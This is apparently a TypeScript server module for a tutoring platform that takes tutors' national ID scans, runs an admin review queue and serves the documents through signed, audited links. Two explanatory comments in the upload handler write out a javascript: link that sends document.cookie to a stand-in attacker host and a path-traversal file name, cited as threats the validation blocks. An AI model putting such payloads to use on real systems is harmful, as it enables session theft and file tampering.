import type { FastifyInstance } from "fastify";
import { z } from "zod";
import {
  and, eq, inArray, isNull, or, sql as raw,
  profiles, tutors, verificationDocs, notify,
  objectStore, storageKey,
  docEncryptionConfigured, sealDoc, openDoc, DocCryptoError,
} from "@tnajem/db";
import { docKind } from "@tnajem/db";

/** The enum values, derived from the schema rather than re-typed. */
type DocKind = (typeof docKind.enumValues)[number];
import {
  vUuid, vText, vOptionalText, vOptionalUrl, safeFileName, isUuid,
  adminNotifyEmails, sniffMime,
  type PendingTutor, type TutorVerification,
  PUBLIC_TEACHER_DECLARATION_VERSION,
} from "@tnajem/shared";
import { mailEnabled, sendMail } from "@tnajem/shared/mail";
import { db } from "../db";
import { getSession } from "../lib/session";
import { requireAdmin } from "../lib/admin";
import { checkRateLimit } from "../lib/rate-limit";
import { auditAdmin, auditAdminStrict } from "../lib/audit";
import { checkDocLink, docLink } from "../lib/doc-links";

/* uploads + admin — the most sensitive surface in the product. These endpoints
   accept, store and stream Tunisian national ID cards.

   uploads and admin move TOGETHER because they share the object store (and its
   key containment check), and the admin allowlist. Splitting them would
   have shipped a document route whose gate lived in the other half. */

const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket
const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;

const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
  { field: "idFront", kind: "id_front", required: true },
  { field: "idBack", kind: "id_back" },
  { field: "selfie", kind: "selfie" },
  { field: "diploma", kind: "diploma" },
  { field: "certificate", kind: "certificate" },
  { field: "roleProof", kind: "role_proof" },
];

/* Content sniffing lives in ONE place: packages/shared/src/uploads.ts (sniffMime),
   shared with materials and avatars and unit-tested there. This file used to carry
   a second copy of it with no test of its own. `File.type` is the client's claim;
   the SNIFFED type is what gets stored. */

/* Content-Type allow-list for the READ path. Anything not on it is served as
   application/octet-stream + attachment, so an unexpected byte stream can never be
   rendered as an active document in the admin's authenticated origin. */
const SAFE_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;

const tutorIdBody = z.object({ tutorId: z.string() });
/* submittedAt: the version of the application the admin actually looked at. */
const approveBody = z.object({
  tutorId: z.string(),
  submittedAt: z.string().nullable(),
  /* phase-a lane L4 (A26): the requested new name the admin actually looked at, for a
     verified tutor's rename. Bound like submittedAt: a name changed since is refused. */
  pendingName: z.string().nullable().optional(),
});
const rejectBody = z.object({ tutorId: z.string(), note: z.string().optional() });
/** A refusal reason the tutor will read in their notification. */
const REJECT_NOTE_MIN = 5;

/* phase-a lane L4 (A15): the Décret 2015-1619 declaration must belong to the round
   being approved. POST /verification stamps it with the same instant as
   submitted_at, so a declaration older than submitted_at belongs to an earlier
   round (or to nothing: a dossier from before 0024 has none at all).
   LEGAL-REVIEW: whether a declaration plus an admin check meets the obligation. */
function declarationCoversRound(t: { publicTeacherDeclaredAt: Date | null; submittedAt: Date | null }): boolean {
  if (!t.publicTeacherDeclaredAt) return false;
  return !t.submittedAt || t.publicTeacherDeclaredAt.getTime() >= t.submittedAt.getTime();
}

/* phase-a lane L4 (A26): A RE-REVIEW. A VERIFIED tutor with something waiting for an
   admin — a rename (pending_full_name), or a round of documents submitted after the
   last decision. They stay verified and public meanwhile; only the change waits.
   The SQL and the JS must say the same thing: the queue lists with one, the
   decisions check with both. */
const openReReviewSql = raw`(${tutors.status} = 'verified' and (${tutors.pendingFullName} is not null or (${tutors.submittedAt} is not null and (${tutors.reviewedAt} is null or ${tutors.submittedAt} > ${tutors.reviewedAt}))))`;
function hasOpenReReview(t: {
  status: string; pendingFullName: string | null; submittedAt: Date | null; reviewedAt: Date | null;
}): boolean {
  if (t.status !== "verified") return false;
  if (t.pendingFullName !== null) return true;
  return t.submittedAt !== null && (t.reviewedAt === null || t.submittedAt.getTime() > t.reviewedAt.getTime());
}

export async function adminRoutes(app: FastifyInstance): Promise<void> {
  /* ── POST /verification (multipart) ──────────────────────────────────────── */
  app.post("/verification", async (req, reply) => {
    const session = await getSession(req);
    if (!session) return { ok: false, error: "not-authenticated" };
    const [mine] = await db
      .select()
      .from(tutors)
      .where(eq(tutors.profileId, session.profile.id))
      .limit(1);
    if (!mine) return { ok: false, error: "no-storefront" };

    /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
       often it could be called: a signed-in tutor could loop this and fill the
       disk — the same volume the app and every other tutor's documents live on. */
    const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000);
    if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };

    /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
       bounds the TOTAL, so a patient attacker cannot drip-feed the disk full over
       days. Rows are only ever removed by the retention purge. */
    const [{ n: docCount } = { n: 0 }] = await db
      .select({ n: raw<number>`count(*)::int` })
      .from(verificationDocs)
      .where(eq(verificationDocs.tutorId, mine.id));

    const incoming: { kind: DocKind; fileName: string; bytes: Buffer; mime: string }[] = [];
    const fields = new Map<string, string>();

    for await (const part of req.parts()) {
      if (part.type === "file") {
        const spec = DOC_FIELDS.find((d) => d.field === part.fieldname);
        if (!spec) {
          await part.toBuffer(); // drain, otherwise the stream stalls
          continue;
        }
        const bytes = await part.toBuffer();

        /* @fastify/multipart TRUNCATES at `limits.fileSize` — it does NOT throw.
           Miss this check and an oversized upload is silently persisted as a
           CUT-OFF national ID scan, which an admin then approves believing they
           looked at a whole document. This is the single easiest way to ship a
           broken verification pipeline, so it is checked first. */
        if (part.file.truncated || bytes.length > MAX_DOC_BYTES) {
          return { ok: false, error: "file-too-large" };
        }
        if (bytes.length === 0) continue;

        // The real gate: what the bytes ACTUALLY are, not what the client claimed.
        const sniffed = sniffMime(bytes);
        if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };

        incoming.push({
          kind: spec.kind,
          fileName: part.filename ?? "document",
          bytes,
          mime: sniffed,
        });
      } else {
        fields.set(part.fieldname, String(part.value ?? ""));
      }
    }

    for (const d of DOC_FIELDS) {
      if (d.required && !incoming.some((i) => i.kind === d.kind)) {
        return { ok: false, error: "id-required" };
      }
    }

    if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
      return { ok: false, error: "too-many-documents" };
    }

    /* DÉCRET 2015-1619. Nobody who teaches in a public school may be featured, so
       the declaration is a condition of submitting, checked before anything is
       written, and stored (with its wording version) on the application the
       admin reviews. LEGAL-REVIEW in @tnajem/shared/legal. */
    if (fields.get("notPublicTeacher") !== "yes") return { ok: false, error: "declaration-required" };

    /* Text + link fields. The seven *Url fields land in the tutors row and are
       rendered as <a href> on the ADMIN review page — a tutor submitting
       `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" would
       be planting a link that fires in the one session that can read every
       national ID scan in the system. vOptionalUrl enforces an http/https scheme
       allow-list, which is what kills javascript:, data: and file:. */
    const textField = (name: string, max: number) =>
      vOptionalText(fields.get(name), { field: name, max });
    const urlField = (name: string) => vOptionalUrl(fields.get(name), { field: name });

    const institution = textField("institution", 120);
    if (!institution.ok) return { ok: false, error: institution.error };
    const languages = textField("languages", 120);
    if (!languages.ok) return { ok: false, error: languages.error };
    const pitch = textField("pitch", 600);
    if (!pitch.ok) return { ok: false, error: pitch.error };

    const linkedin = urlField("linkedinUrl");
    if (!linkedin.ok) return { ok: false, error: linkedin.error };
    const instagram = urlField("instagramUrl");
    if (!instagram.ok) return { ok: false, error: instagram.error };
    const tiktok = urlField("tiktokUrl");
    if (!tiktok.ok) return { ok: false, error: tiktok.error };
    const youtube = urlField("youtubeUrl");
    if (!youtube.ok) return { ok: false, error: youtube.error };
    const facebook = urlField("facebookUrl");
    if (!facebook.ok) return { ok: false, error: facebook.error };
    const website = urlField("websiteUrl");
    if (!website.ok) return { ok: false, error: website.error };
    const introVideo = urlField("introVideoUrl");
    if (!introVideo.ok) return { ok: false, error: introVideo.error };

    const yearsRaw = fields.get("experienceYears");
    const years =
      yearsRaw && yearsRaw.trim()
        ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0))
        : null;

    /* PERSIST — only now, after every field has been validated. It used to write the
       ID scans first and validate the text fields after: a submission with a bad link
       left files and rows behind for a tutor still in draft, which the retention
       purge never reaches (it purges decided tutors), and four such attempts filled
       the 24-document cap for good (security review, 15 Sept 2026).

       Keys are verification/<tutorId>/<file> in the object store — never a public
       directory or bucket; the only reader is the admin-gated route below. `mine.id`
       comes from the session's own tutor row, so a tutor can only write into their
       OWN folder. Each file is SEALED (packages/db/src/doc-crypto.ts) before it
       leaves this process. */
    const store = objectStore();
    const stamp = Date.now();
    const written = incoming.map((doc, i) => ({
      ...doc,
      /* safeFileName strips directory components and everything outside
         [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to
         a flat, inert name. The index keeps two files of one kind apart. */
      key: `verification/${mine.id}/${doc.kind}-${stamp}-${i}-${safeFileName(doc.fileName, 60)}`,
    }));

    const sealing = docEncryptionConfigured();
    if (!sealing) {
      // Only reachable outside production: the API refuses to boot there without a key.
      req.log.warn("DOC_ENCRYPTION_KEY is not set — storing identity documents UNENCRYPTED (development only)");
    }
    try {
      for (const w of written) await store.put(w.key, sealing ? sealDoc(w.key, w.bytes) : w.bytes);
      /* Rows and the status change in ONE transaction: a dossier is pending with all
         of its documents, or not at all. */
      await db.transaction(async (tx) => {
        for (const w of written) {
          await tx.insert(verificationDocs).values({
            tutorId: mine.id,
            kind: w.kind,
            // The SANITIZED name: this string is echoed into a Content-Disposition
            // header by the stream route, and a raw client name could carry CR/LF.
            fileName: safeFileName(w.fileName, 60),
            storagePath: w.key, // the object key itself: POSIX separators, always
            mime: w.mime, // the SNIFFED type — never the client's claim
            sizeBytes: w.bytes.length, // the document's size, not the sealed object's
          });
        }
        // phase-a lane L4 (A15): ONE instant — the declaration belongs to this round.
        const submittedNow = new Date();
        await tx
          .update(tutors)
          .set({
            /* phase-a lane L4 (A26): a VERIFIED tutor who resubmits stays verified and
               in Explore; the new round is reviewed as a re-review (submitted_at after
               reviewed_at). Everyone else's application goes (back) to pending. */
            ...(mine.status === "verified" ? {} : { status: "pending" as const }),
            submittedAt: submittedNow,
            publicTeacherDeclaredAt: submittedNow,
            publicTeacherDeclarationVersion: PUBLIC_TEACHER_DECLARATION_VERSION,
            reviewNote: null,
            experienceYears: years,
            institution: institution.value,
            languages: languages.value,
            pitch: pitch.value,
            linkedinUrl: linkedin.value,
            instagramUrl: instagram.value,
            tiktokUrl: tiktok.value,
            youtubeUrl: youtube.value,
            facebookUrl: facebook.value,
            websiteUrl: website.value,
            introVideoUrl: introVideo.value,
          })
          .where(eq(tutors.id, mine.id));
      });
    } catch (e) {
      // Nothing half-submitted is left behind: files first, so remove what was written.
      await Promise.all(written.map((w) => store.delete(w.key).catch(() => "missing")));
      throw e;
    }

    /* Tell a human. Without this the queue was write-only: a tutor uploaded their
       national ID, several screens told them someone would look at it, and no
       signal ever left the database. E-mail rather than notify(): admins are an
       env allow-list, not necessarily profiles with a notifications feed. */
    const to = adminNotifyEmails(process.env);
    if (to.length && mailEnabled()) {
      const subject = `Tnajem — nouvelle demande de vérification : ${mine.fullName}`;
      const body =
        `${mine.fullName} (tnajem.com/${mine.slug}) a soumis ses documents.\n\n` +
        `File d'attente : /admin/verifications`;
      await Promise.all(to.map((addr) => sendMail(addr, subject, body)));
    } else if (!to.length) {
      req.log.warn(
        { tutorId: mine.id },
        "verification submitted but ADMIN_EMAILS is empty — nobody was alerted",
      );
    }

    return { ok: true };
  });

  /* ── GET /verification/mine ──────────────────────────────────────────────── */
  app.get("/verification/mine", async (req): Promise<TutorVerification | null> => {
    const session = await getSession(req);
    if (!session) return null;
    const [mine] = await db
      .select()
      .from(tutors)
      .where(eq(tutors.profileId, session.profile.id))
      .limit(1);
    if (!mine) return null;

    const docs = await db
      .select()
      .from(verificationDocs)
      .where(eq(verificationDocs.tutorId, mine.id));

    return {
      status: mine.status,
      experienceYears: mine.experienceYears ?? null,
      institution: mine.institution ?? null,
      languages: mine.languages ?? null,
      pitch: mine.pitch ?? null,
      links: {
        linkedin: mine.linkedinUrl ?? null,
        instagram: mine.instagramUrl ?? null,
        tiktok: mine.tiktokUrl ?? null,
        youtube: mine.youtubeUrl ?? null,
        facebook: mine.facebookUrl ?? null,
        website: mine.websiteUrl ?? null,
        introVideo: mine.introVideoUrl ?? null,
      },
      reviewNote: mine.reviewNote ?? null,
      docKinds: docs.map((d) => d.kind),
    };
  });

  /* ── GET /admin/verifications ────────────────────────────────────────────── */
  app.get("/admin/verifications", async (req) => {
    const session = await requireAdmin(req);
    if (!session) return { ok: false, admin: false, items: [] as PendingTutor[] };

    /* Bounded: the review queue is a work list, not an export. Oldest first so
       nobody's application is starved at the bottom of an unbounded scan. */
    const rows = await db
      .select()
      .from(tutors)
      // phase-a lane L4 (A26): plus verified tutors with a rename or a new round to review.
      .where(or(eq(tutors.status, "pending"), openReReviewSql))
      .orderBy(tutors.submittedAt)
      .limit(100);
    if (rows.length === 0) return { ok: true, admin: true, items: [] as PendingTutor[] };

    /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor. At 100
       applications that was 101 round-trips for one page load. */
    const allDocs = await db
      .select()
      .from(verificationDocs)
      .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));

    const docsByTutor = new Map<string, typeof allDocs>();
    for (const d of allDocs) {
      const list = docsByTutor.get(d.tutorId);
      if (list) list.push(d);
      else docsByTutor.set(d.tutorId, [d]);
    }

    /* phase-a lane L4 (A10): ONE ROUND ON THE CARD. Every document the tutor ever
       uploaded used to sit on the card, undated — two "Identité (recto)" after a
       resubmission, and nothing to say which was current. A round is one POST
       /verification: its rows are inserted in ONE transaction, so they share
       created_at (the transaction's now()) exactly. The newest round is the card;
       the rest are "Soumissions précédentes", newest first. */
    const link = (d: (typeof allDocs)[number]) => ({
      id: d.id,
      kind: d.kind,
      fileName: d.fileName,
      // Short-lived and bound to THIS admin (lib/doc-links.ts). Never the bare id.
      url: docLink(d.id, session.profile.id),
    });
    const roundsOf = (tutorId: string) => {
      const byAt = new Map<number, typeof allDocs>();
      for (const d of docsByTutor.get(tutorId) ?? []) {
        const at = d.createdAt.getTime();
        const list = byAt.get(at);
        if (list) list.push(d);
        else byAt.set(at, [d]);
      }
      return [...byAt.entries()]
        .sort(([a], [b]) => b - a)
        .map(([at, docs]) => ({ submittedAt: new Date(at).toISOString(), docs: docs.map(link) }));
    };

    const items: PendingTutor[] = rows.map((t) => ({
      tutorId: t.id,
      slug: t.slug,
      name: t.fullName,
      subject: t.subject,
      experienceYears: t.experienceYears ?? null,
      institution: t.institution ?? null,
      languages: t.languages ?? null,
      pitch: t.pitch ?? null,
      links: {
        linkedin: t.linkedinUrl ?? null,
        instagram: t.instagramUrl ?? null,
        tiktok: t.tiktokUrl ?? null,
        youtube: t.youtubeUrl ?? null,
        facebook: t.facebookUrl ?? null,
        website: t.websiteUrl ?? null,
        introVideo: t.introVideoUrl ?? null,
      },
      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
      publicTeacherDeclaration: t.publicTeacherDeclaredAt
        ? { declaredAt: t.publicTeacherDeclaredAt.toISOString(), version: t.publicTeacherDeclarationVersion ?? "" }
        : null,
      ...(() => {
        const [current, ...previous] = roundsOf(t.id);
        return {
          docs: current?.docs ?? [],
          docsSubmittedAt: current?.submittedAt ?? null,
          previousRounds: previous,
        };
      })(),
      // phase-a lane L4 (A26)
      reReview: hasOpenReReview(t),
      pendingName: t.status === "verified" ? (t.pendingFullName ?? null) : null,
    }));

    return { ok: true, admin: true, items };
  });

  /* ── POST /admin/verifications/approve ───────────────────────────────────── */
  app.post("/admin/verifications/approve", async (req, reply) => {
    const parsed = approveBody.safeParse(req.body);
    if (!parsed.success) return reply.code(400).send({ error: "bad-request" });

    const session = await requireAdmin(req);
    if (!session) return { ok: false, error: "forbidden" };

    const tutorId = vUuid(parsed.data.tutorId, { field: "tutor" });
    if (!tutorId.ok) return { ok: false, error: "not-found" };

    const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
    if (!t) return { ok: false, error: "not-found" };

    /* Separation of duties: an admin who also runs a tutor storefront must not be
       able to verify their OWN identity documents. A second admin signs it off. */
    if (t.profileId && t.profileId === session.profile.id) {
      return { ok: false, error: "self-approval-forbidden" };
    }
    /* Only a SUBMITTED application can be approved — otherwise a draft tutor who
       never uploaded an ID could be waved through by a misclick. The status is
       re-checked IN the UPDATE: two admins deciding the same application at once
       used to both "win", the second silently overwriting the first decision. */
    /* APPROVE WHAT WAS REVIEWED. The queue shows a submission as of submittedAt;
       a resubmission (new documents, new links) moves it. Approving used to accept
       whatever was current at click time, so a tutor could swap the dossier between
       the admin opening it and approving it (security review, 15 Sept 2026). The
       admin's version is part of the UPDATE's condition, like the status. */
    /* null is a real version: a pending row with no submission time (older rows).
       It must then still be null. Omitting the field is a 400. */
    const reviewed = parsed.data.submittedAt === null ? null : new Date(parsed.data.submittedAt);
    if (reviewed && Number.isNaN(reviewed.getTime())) return reply.code(400).send({ error: "bad-request" });
    /* phase-a lane L4 (A15): NO DECLARATION, NO APPROVAL. Only the UI used to remind
       the admin. A 4xx and nothing written — no status, no audit row, no message. */
    const reReview = hasOpenReReview(t); // phase-a lane L4 (A26)
    if ((t.status === "pending" || reReview) && !declarationCoversRound(t)) {
      return reply.code(422).send({ ok: false, error: "declaration-missing" });
    }
    const versionCond = reviewed
      ? raw`date_trunc('milliseconds', ${tutors.submittedAt}) = ${reviewed.toISOString()}::timestamptz`
      : isNull(tutors.submittedAt);
    const declarationCond = raw`${tutors.publicTeacherDeclaredAt} is not null and (${tutors.submittedAt} is null or ${tutors.publicTeacherDeclaredAt} >= ${tutors.submittedAt})`;

    /* phase-a lane L4 (A26): A RE-REVIEW. The tutor is verified and stays verified;
       what is approved is the change — the new name goes public (storefront, and the
       profile that message threads read), the new round is on record as decided. */
    if (reReview) {
      const expectedName = parsed.data.pendingName ?? null;
      if (expectedName !== t.pendingFullName) return { ok: false, error: "changed-since-review" };
      const decidedRe = await db.transaction(async (tx) => {
        const [d] = await tx
          .update(tutors)
          .set({
            fullName: raw`coalesce(${tutors.pendingFullName}, ${tutors.fullName})`,
            pendingFullName: null,
            reviewedAt: new Date(),
            reviewNote: null,
          })
          .where(
            and(
              eq(tutors.id, t.id),
              openReReviewSql,
              versionCond,
              expectedName === null ? isNull(tutors.pendingFullName) : eq(tutors.pendingFullName, expectedName),
              declarationCond,
            ),
          )
          .returning({ fullName: tutors.fullName });
        if (d && expectedName !== null && t.profileId) {
          await tx.update(profiles).set({ fullName: d.fullName }).where(eq(profiles.id, t.profileId));
        }
        // Phase A+ (P3): the audit row commits WITH the decision, or neither does.
        if (d) {
          await auditAdmin(session.profile.id, "verification.approve", { kind: "tutor", id: t.id },
            expectedName !== null ? "re-review: rename" : "re-review: documents", tx);
        }
        return d;
      });
      if (!decidedRe) {
        const [now] = await db.select().from(tutors).where(eq(tutors.id, t.id)).limit(1);
        return { ok: false, error: now && hasOpenReReview(now) ? "changed-since-review" : "not-pending" };
      }
      if (t.profileId) {
        await notify(db, t.profileId, {
          key: expectedName !== null ? "verificationChangeApprovedName" : "verificationChangeApprovedDocs",
          params: {},
          href: "/dashboard",
        });
      }
      return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
    }

    // Phase A+ (P3): the verification and its audit row commit together, or neither does.
    const decided = await db.transaction(async (tx) => {
      const [d] = await tx
        .update(tutors)
        .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
        .where(
          and(
            eq(tutors.id, tutorId.value),
            eq(tutors.status, "pending"),
            versionCond,
            // phase-a lane L4 (A15): re-checked in the UPDATE, like the status and version.
            declarationCond,
          ),
        )
        .returning({ id: tutors.id });
      if (d) await auditAdmin(session.profile.id, "verification.approve", { kind: "tutor", id: t.id }, null, tx);
      return d;
    });
    if (!decided) {
      const [now] = await db.select({ status: tutors.status }).from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
      return { ok: false, error: now?.status === "pending" ? "changed-since-review" : "not-pending" };
    }

    if (t.profileId) {
      await notify(db, t.profileId, {
        key: "verificationApproved",
        params: { slug: t.slug },
        href: "/dashboard",
        sms: true,
      });
    }

    /* The decision must be effective NOW, not in up to 60s (storefront) or an hour
       (sitemap). On approve that is a UX win; on reject it is a compliance
       control. The web replays both from this envelope. */
    return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
  });

  /* ── POST /admin/verifications/reject ────────────────────────────────────── */
  app.post("/admin/verifications/reject", async (req, reply) => {
    const parsed = rejectBody.safeParse(req.body);
    if (!parsed.success) return reply.code(400).send({ error: "bad-request" });

    const session = await requireAdmin(req);
    if (!session) return { ok: false, error: "forbidden" };

    /* A REASON IS REQUIRED. The tutor reads it in their notification and has to
       act on it; "your application was not validated" with nothing to fix is a
       dead end, and an unexplained refusal is not something we can stand behind. */
    const note = vText(parsed.data.note, { field: "note", max: 500, min: REJECT_NOTE_MIN });
    if (!note.ok) return { ok: false, error: note.error === "note-too-long" ? "note-too-long" : "note-required" };
    const tutorId = vUuid(parsed.data.tutorId, { field: "tutor" });
    if (!tutorId.ok) return { ok: false, error: "not-found" };

    const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
    if (!t) return { ok: false, error: "not-found" };
    if (t.profileId && t.profileId === session.profile.id) {
      return { ok: false, error: "self-approval-forbidden" };
    }

    /* phase-a lane L4 (A26): REFUSING A RE-REVIEW refuses the CHANGE, not the tutor:
       the requested name is dropped, the new round is on record as decided, and the
       tutor stays verified under the approved name. Un-verifying a live tutor is
       still an account block, never this. */
    if (hasOpenReReview(t)) {
      const decidedRe = await db.transaction(async (tx) => {
        const [d] = await tx
          .update(tutors)
          .set({ pendingFullName: null, reviewedAt: new Date(), reviewNote: note.value })
          .where(and(eq(tutors.id, t.id), openReReviewSql))
          .returning({ id: tutors.id });
        if (d) await auditAdmin(session.profile.id, "verification.reject", { kind: "tutor", id: t.id }, "re-review: stays verified", tx); // Phase A+ (P3)
        return d;
      });
      if (!decidedRe) return { ok: false, error: "not-pending" };
      if (t.profileId) {
        await notify(db, t.profileId, {
          key: "verificationChangeRejected",
          params: { note: note.value },
          href: "/dashboard",
        });
      }
      return { ok: true, revalidate: { tutors: [t.slug] } };
    }

    /* PENDING ONLY. This used to take any tutor, so "reject" doubled as an
       undocumented way to un-verify a live tutor — no reason required, no audit
       row, their bookings untouched. Taking a verified tutor down is an account
       block (routes/admin-accounts.ts), which says what happens to their classes. */
    /* The reason stays in tutors.review_note; the audit row records the decision,
       not a second copy of text written about a person. Phase A+ (P3): one
       transaction — no rejection without its row. */
    const decided = await db.transaction(async (tx) => {
      const [d] = await tx
        .update(tutors)
        .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
        .where(and(eq(tutors.id, tutorId.value), eq(tutors.status, "pending")))
        .returning({ id: tutors.id });
      if (d) await auditAdmin(session.profile.id, "verification.reject", { kind: "tutor", id: t.id }, null, tx);
      return d;
    });
    if (!decided) return { ok: false, error: "not-pending" };

    if (t.profileId) {
      await notify(db, t.profileId, {
        key: "verificationRejected",
        params: { note: note.value },
        href: "/onboarding/verify",
        sms: true,
      });
    }

    /* THE COMPLIANCE ONE. The storefront 404s for a non-verified tutor, but the
       page is ISR-cached for 60s and the sitemap for an hour — so without this the
       page of a tutor we have just REJECTED (possibly for a failed ID check, on a
       platform used by minors) keeps being served for another minute and
       advertised for another hour. The TTL is the backstop; this is the control. */
    return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
  });

  /* ── GET /admin/doc/:id?exp&sig — returns a national ID scan ─────────────── */
  app.get<{ Params: { id: string }; Querystring: { exp?: string; sig?: string } }>("/admin/doc/:id", async (req, reply) => {
    const session = await requireAdmin(req);
    if (!session) return reply.code(403).type("text/plain").send("Forbidden");

    if (!isUuid(req.params.id)) return reply.code(400).type("text/plain").send("Bad request");

    /* THE LINK. A document is never addressable by its id alone: the queue issues a
       signed link per document, per admin, valid DOC_LINK_TTL_SEC. */
    const link = checkDocLink(req.params.id, session.profile.id, req.query ?? {});
    if (link === "expired") {
      return reply
        .code(410)
        .type("text/plain; charset=utf-8")
        .header("cache-control", "no-store")
        .send("Lien expiré — rechargez la page de vérification. / انتهت صلوحية الرابط، عاود حمّل صفحة التثبّت.");
    }
    if (link !== "ok") return reply.code(403).type("text/plain").send("Forbidden");

    const [doc] = await db
      .select()
      .from(verificationDocs)
      .where(eq(verificationDocs.id, req.params.id))
      .limit(1);
    if (!doc) return reply.code(404).type("text/plain").send("Not found");

    /* A row whose key could escape the store is refused before any read (defence
       in depth: the value is ours, but one bad row must not read an arbitrary file). */
    try {
      storageKey(doc.storagePath, { legacy: true });
    } catch {
      return reply.code(400).type("text/plain").send("Bad request");
    }

    let stored: Buffer | null;
    try {
      stored = await objectStore().get(doc.storagePath);
    } catch (e) {
      req.log.error({ code: (e as { code?: string }).code ?? (e as Error).name }, "document store read failed");
      return reply.code(503).type("text/plain").send("Unavailable");
    }
    if (!stored) return reply.code(404).type("text/plain").send("Not found");

    let bytes: Buffer;
    try {
      const opened = openDoc(doc.storagePath, stored);
      if (opened.sealedWith === "plaintext") req.log.warn({ docId: doc.id }, "identity document stored unencrypted — run npm run db:encrypt-docs");
      bytes = opened.plaintext;
    } catch (e) {
      const code = e instanceof DocCryptoError ? e.code : (e as Error).name;
      req.log.error({ docId: doc.id, code }, "identity document could not be opened");
      return reply.code(500).type("text/plain").send("Document unreadable");
    }

    /* EVERY READ IS AUDITED, and the audit row comes FIRST. Unlike a moderation
       action, a disclosure without a record is the failure: if the row cannot be
       written, the document is not sent. The request id ties the row to the log. */
    try {
      await auditAdminStrict(session.profile.id, "verification.doc.read", { kind: "verification_doc", id: doc.id }, `request ${req.id}`);
    } catch {
      return reply.code(503).type("text/plain").send("Unavailable");
    }

    /* Every header below is deliberate. This is the one URL in the product that
       returns a Tunisian national ID card.
         - Content-Type from the allow-list ONLY; anything else is octet-stream +
           attachment, so an unexpected byte stream cannot render as an active
           document inside the admin's authenticated origin.
         - CSP default-src 'none' + sandbox: even a crafted SVG/HTML cannot run.
         - nosniff: stops the browser second-guessing the type.
         - no-store: an ID scan must not sit in a disk cache.
         - ATTACHMENT, always: an ID scan is never rendered in the app's origin, and
           CSP sandbox is the second wall behind that, not the first.
         - The filename is already sanitised at write time (CR/LF header injection). */
    const safeType = SAFE_MIME.test(doc.mime ?? "") ? (doc.mime as string) : "application/octet-stream";
    const disposition = "attachment";

    return reply
      .header("content-type", safeType)
      .header("content-disposition", `${disposition}; filename="${safeFileName(doc.fileName, 60)}"`)
      .header("content-security-policy", "default-src 'none'; img-src 'self'; object-src 'none'; sandbox")
      .header("x-content-type-options", "nosniff")
      .header("cache-control", "private, no-store, max-age=0")
      .header("referrer-policy", "no-referrer")
      .send(bytes);
  });
}
